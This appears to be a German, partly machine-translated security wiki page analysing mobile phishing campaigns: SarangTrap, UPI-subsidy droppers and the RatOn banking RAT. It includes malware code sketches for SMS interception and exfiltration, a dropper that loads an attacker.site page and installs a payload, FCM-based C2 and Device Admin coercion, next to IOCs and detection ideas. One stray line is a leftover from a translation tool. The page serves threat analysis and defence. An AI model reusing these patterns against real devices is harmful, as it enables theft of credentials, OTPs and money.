# Mobile-Phishing & Verbreitung bösartiger Apps (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite beschreibt Techniken, die von Threat Actors verwendet werden, um **bösartige Android-APKs** und **iOS mobile-configuration profiles** über Phishing (SEO, Social Engineering, Fake-Stores, Dating-Apps, etc.) zu verbreiten.
> Das Material basiert auf der SarangTrap-Kampagne, aufgedeckt von Zimperium zLabs (2025), und weiterer öffentlicher Forschung.

## Angriffsablauf

1. **SEO/Phishing-Infrastruktur**
* Registrierung Dutzender Look-alike-Domains (Dating, cloud share, Autodienst…).
– Nutzung lokaler Schlüsselwörter und Emojis im `<title>`-Element, um in Google zu ranken.
– Auf derselben Landing-Page sowohl Android (`.apk`) als auch iOS-Installationsanweisungen hosten.
2. **Erste Stufe: Download**
* Android: direkter Link zu einer *unsigned* oder „third-party store“ APK.
* iOS: `itms-services://` oder plain HTTPS-Link zu einem bösartigen **mobileconfig**-Profile (siehe unten).
3. **Social Engineering nach der Installation**
* Beim ersten Start fragt die App nach einem **Einladungs-/Verifikationscode** (Illusion exklusiven Zugriffs).
* Der Code wird **per POST über HTTP** an das Command-and-Control (C2) gesendet.
* C2 antwortet `{"success":true}` ➜ Malware setzt sich fort.
* Sandbox-/AV-Dynamikanalysen, die niemals einen gültigen Code senden, sehen **kein bösartiges Verhalten** (Evasion).
4. **Missbrauch von Laufzeitberechtigungen (Android)**
* Gefährliche Berechtigungen werden erst **nach positiver C2-Antwort** angefragt:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Neuere Varianten **entfernen `<uses-permission>` für SMS aus der `AndroidManifest.xml`**, lassen aber den Java/Kotlin-Codepfad, der SMS per Reflection liest ⇒ senkt den statischen Score, bleibt aber auf Geräten funktionsfähig, die die Berechtigung via `AppOps`-Missbrauch oder bei alten Targets gewähren.
5. **Fassade-UI & Hintergrundsammlung**
* Die App zeigt harmlose Views (SMS-Viewer, Gallery-Picker), lokal implementiert.
* Gleichzeitig exfiltriert sie:
- IMEI / IMSI, Telefonnummer
- Voller `ContactsContract`-Dump (JSON-Array)
- JPEG/PNG aus `/sdcard/DCIM`, komprimiert mit [Luban](https://github.com/Curzibn/Luban) zur Größenreduktion
- Optional SMS-Inhalte (`content://sms`)
Payloads werden **batch-gezipt** und via `HTTP POST /upload.php` gesendet.
6. **iOS-Auslieferungstechnik**
* Ein einzelnes mobile-configuration profile kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. anfordern, um das Gerät in eine „MDM“-ähnliche Aufsicht einzubinden.
* Social-Engineering-Anleitung:
1. Einstellungen öffnen ➜ *Profile heruntergeladen*.
2. Dreimal auf *Install* tippen (Screenshots auf der Phishing-Seite).
3. Dem unsigned Profile vertrauen ➜ Angreifer erhält *Contacts*- & *Photo*-Entitlement ohne App Store-Review.
7. **Netzwerkschicht**
* Plain HTTP, oft auf Port 80 mit HOST-Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Defensive Testing / Red-Team Tipps

* **Dynamic Analysis Bypass** – Während der Malware-Analyse die Einladungs-Code-Phase mit Frida/Objection automatisieren, um den bösartigen Zweig zu erreichen.
* **Manifest vs. Runtime Diff** – `aapt dump permissions` mit der Laufzeit-`PackageManager#getRequestedPermissions()` vergleichen; fehlende gefährliche Perms sind verdächtig.
* **Network Canary** – `iptables -p tcp --dport 80 -j NFQUEUE` konfigurieren, um unstete POST-Bursts nach Code-Eingabe zu erkennen.
* **mobileconfig Inspection** – `security cms -D -i profile.mobileconfig` auf macOS nutzen, um `PayloadContent` aufzulisten und übermäßige Entitlements zu erkennen.

## Blue-Team Erkennungsansätze

* **Certificate Transparency / DNS-Analysen**, um plötzliche Wellen keywordreicher Domains zu erfassen.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` von Dalvik-Clients außerhalb des Google Play-Kontexts.
* **Invite-code Telemetrie** – POSTs von 6–8-stelligen numerischen Codes kurz nach APK-Installation können auf Staging hinweisen.
* **MobileConfig Signing** – Unsigned configuration profiles per MDM-Policy blockieren.

## Nützliches Frida-Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indikatoren (Allgemein)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Dieses Muster wurde in Kampagnen beobachtet, die Themen zu staatlichen Leistungen missbrauchen, um indische UPI-Zugangsdaten und OTPs zu stehlen. Betreiber verknüpfen vertrauenswürdige Plattformen, um Zustellung und Resilienz zu gewährleisten.

### Delivery chain across trusted platforms
- YouTube-Video-Köder → Beschreibung enthält einen Kurzlink
- Kurzlink → GitHub Pages phishing site, die das legitime Portal imitiert
- Dasselbe GitHub-Repo hostet eine APK mit einem gefälschten “Google Play”-Badge, das direkt auf die Datei verlinkt
- Dynamische phishing pages sind auf Replit aktiv; der Remote-Kommando-Kanal verwendet Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Die erste APK ist ein Installer (dropper), der die eigentliche Malware in `assets/app.apk` ausliefert und den Nutzer auffordert, Wi‑Fi/mobile Daten zu deaktivieren, um Cloud-Erkennung zu erschweren.
- Der eingebettete Payload installiert sich unter einem harmlosen Namen (z. B. “Secure Update”). Nach der Installation sind sowohl der Installer als auch der Payload als separate Apps vorhanden.

Tipp zur statischen Triage (grep nach embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamic endpoint discovery via shortlink
- Malware lädt eine plain-text, comma-separated Liste mit live endpoints von einem shortlink herunter; einfache string transforms erzeugen den finalen phishing page path.

Beispiel (bereinigt):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-basierte UPI credential harvesting
- Der “Make payment of ₹1 / UPI‑Lite” Schritt lädt ein bösartiges HTML-Formular vom dynamischen Endpoint innerhalb einer WebView und erfasst sensible Felder (Telefonnummer, Bank, UPI PIN), die per `POST` an `addup.php` gesendet werden.

Minimaler Loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Selbstverbreitung und SMS/OTP-Abfangung
- Aggressive Berechtigungen werden beim ersten Start angefordert:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte werden durchlaufen, um smishing-SMS massenhaft vom Gerät des Opfers zu versenden.
- Eingehende SMS werden von einem broadcast receiver abgefangen und zusammen mit Metadaten (sender, body, SIM slot, per-device random ID) zu `/addsm.php` hochgeladen.

Receiver-Skizze:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) als robustes C2
- Die payload registriert sich bei FCM; Push-Nachrichten enthalten ein `_type`-Feld, das als Schalter verwendet wird, um Aktionen auszulösen (z. B. Aktualisierung von phishing-Textvorlagen, Umschalten von Verhalten).

Beispiel-FCM-Payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler-Skizze:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK enthält sekundären Payload in `assets/app.apk`
- WebView lädt Zahlung von `gate.htm` und exfiltriert zu `/addup.php`
- SMS-Exfiltration zu `/addsm.php`
- Shortlink-gesteuerter Konfigurationsabruf (z. B. `rebrand.ly/*`) mit zurückgegebenen CSV-Endpunkten
- Apps mit der Bezeichnung „Update/Secure Update“
- FCM `data`-Nachrichten mit einem `_type`-Discriminator in nicht vertrauenswürdigen Apps

### Detection & defence ideas
- Markiere Apps, die Benutzer anweisen, das Netzwerk während der Installation zu deaktivieren und dann ein zweites APK aus `assets/` zu sideloaden.
- Alarm bei dem Berechtigungs-Tupel: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-basierte Zahlungsflüsse.
- Egress-Monitoring für `POST /addup.php|/addsm.php` auf nicht-korporativen Hosts; bekannte Infrastruktur blockieren.
- Mobile EDR-Regeln: nicht vertrauenswürdige App registriert sich für FCM und verzweigt anhand eines `_type`-Felds.

---

## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn Fallstudie

Die RatOn banker/RAT-Kampagne (ThreatFabric) ist ein konkretes Beispiel dafür, wie moderne mobile phishing-Operationen WebView-Dropper, Accessibility-getriebene UI-Automatisierung, Overlays/Ransom, Device-Admin-Zwang, Automated Transfer System (ATS), die Übernahme von Crypto-Wallets und sogar NFC-Relay-Orchestrierung miteinander verbinden. Dieser Abschnitt abstrahiert die wiederverwendbaren Techniken.

### Stage-1: WebView → native install bridge (dropper)
Angreifer präsentieren eine WebView, die auf eine Angreifer-Seite zeigt, und injizieren eine JavaScript-Schnittstelle, die einen nativen Installer exponiert. Ein Tippen auf einen HTML-Button ruft nativen Code auf, der ein in den Assets des dropper gebündeltes second-stage APK installiert und dieses anschließend direkt startet.

Minimal pattern:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Bitte füge den HTML-/Markdown-Inhalt der Seite ein, den ich übersetzen soll. Ich übersetze nur den englischen Fließtext ins Deutsche und lasse Tags, Links, Pfade, Code und spezielle Referenzen unverändert.
```html
<button onclick="bridge.installApk()">Install</button>
```
Nach der Installation startet der dropper die payload über ein explizites package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting-Idee: nicht vertrauenswürdige Apps rufen `addJavascriptInterface()` auf und exponieren installer-ähnliche Methoden an WebView; APK liefert eine eingebettete sekundäre Payload unter `assets/` und ruft die Package Installer Session API auf.

### Zustimmungsablauf: Accessibility + Device Admin + nachfolgende Runtime-Eingabeaufforderungen
Stage-2 öffnet ein WebView, das eine “Access”-Seite hostet. Deren Button ruft eine exportierte Methode auf, die das Opfer zu den Accessibility-Einstellungen navigiert und das Aktivieren des bösartigen Dienstes anfordert. Sobald gewährt, verwendet die Malware Accessibility, um automatisch durch nachfolgende Runtime-Berechtigungsdialoge (contacts, overlay, manage system settings, etc.) zu klicken und fordert Device Admin an.

- Accessibility hilft programmatisch, spätere Aufforderungen anzunehmen, indem es Buttons wie “Allow”/“OK” im Node-Baum findet und Klicks auslöst.
- Overlay-Berechtigungsprüfung/-anfrage:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Siehe auch:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operatoren können Befehle ausgeben, um:
- eine Vollbild-Overlay von einer URL zu rendern, oder
- inline HTML zu übergeben, das in ein WebView-Overlay geladen wird.

Wahrscheinliche Verwendungsfälle: Nötigung (PIN-Eingabe), Öffnen der Wallet zum Abgreifen von PINs, Erpressungsnachrichten. Einen Befehl bereithalten, um sicherzustellen, dass die Overlay-Berechtigung erteilt ist, falls sie fehlt.

### Remote control model – text pseudo-screen + screen-cast
- Niedrige Bandbreite: periodisch den Accessibility node tree dumpen, sichtbare Texte/Rollen/Bounds serialisieren und als pseudo-screen an C2 senden (Befehle wie `txt_screen` einmalig und `screen_live` kontinuierlich).
- Hohe Qualität: MediaProjection anfordern und bei Bedarf screen-casting/recording starten (Befehle wie `display` / `record`).

### ATS playbook (bank app automation)
Anhand einer JSON-Aufgabe die Bank-App öffnen, die UI via Accessibility mit einer Mischung aus Textabfragen und Koordinaten-Taps steuern und die Zahlungs-PIN des Opfers eingeben, wenn dazu aufgefordert.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Neue Zahlung"
- "Zadat platbu" → "Zahlung eingeben"
- "Nový příjemce" → "Neuer Empfänger"
- "Domácí číslo účtu" → "Inländische Kontonummer"
- "Další" → "Weiter"
- "Odeslat" → "Senden"
- "Ano, pokračovat" → "Ja, fortfahren"
- "Zaplatit" → "Bezahlen"
- "Hotovo" → "Fertig"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: entsperren (gestohlener PIN oder angegebenes Passwort), zu Security/Recovery navigieren, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Sofortige Sperre:
```java
dpm.lockNow();
```
- Aktuelle Anmeldeinformation ablaufen lassen, um eine Änderung zu erzwingen (Accessibility erfasst neuen PIN/Passwort):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Erzwinge eine nicht-biometrische Entsperrung, indem keyguard biometric features deaktiviert werden:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Hinweis: Viele DevicePolicyManager-Kontrollen erfordern auf aktuellen Android-Versionen Device Owner/Profile Owner; einige OEM-Builds können jedoch lax sein. Immer auf dem Ziel-OS/OEM validieren.

### NFC-Relay-Orchestrierung (NFSkate)
Stage-3 kann ein externes NFC-relay-Modul installieren und starten (z. B. NFSkate) und ihm sogar eine HTML-Vorlage übergeben, um das Opfer während des Relays zu führen. Dies ermöglicht kontaktloses card-present cash-out neben online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator-Befehlsatz (Beispiel)
- UI/Zustand: `txt_screen`, `screen_live`, `display`, `record`
- Sozial: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Gerät: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Kommunikation/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Erkennungs- & Abwehrideen (RatOn-Stil)
- Nach WebViews suchen, die mit `addJavascriptInterface()` Installer-/Permission-Methoden exponieren; Seiten, die auf “/access” enden und Accessibility-Eingabeaufforderungen auslösen.
- Alarm bei Apps, die kurz nach Gewährung des Service-Zugriffs eine hohe Rate an Accessibility-Gesten/Klicks erzeugen; Telemetrie, die Accessibility-Node-Dumps ähnelt und an C2 gesendet wird.
- Device Admin-Policy-Änderungen in nicht vertrauenswürdigen Apps überwachen: `lockNow`, Passwortablauf, Keyguard-Feature-Toggles.
- Alarm bei MediaProjection-Eingabeaufforderungen von Nicht-Firmen-Apps, gefolgt von periodischen Frame-Uploads.
- Erkennung der Installation/Start eines externen NFC-relay-App, die von einer anderen App ausgelöst wurde.
- Für Banking: außerbandliche Bestätigungen durchsetzen, Biometrie-Bindung und Transaktionslimits, die gegen On-Device-Automatisierung resistent sind.

## Referenzen

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
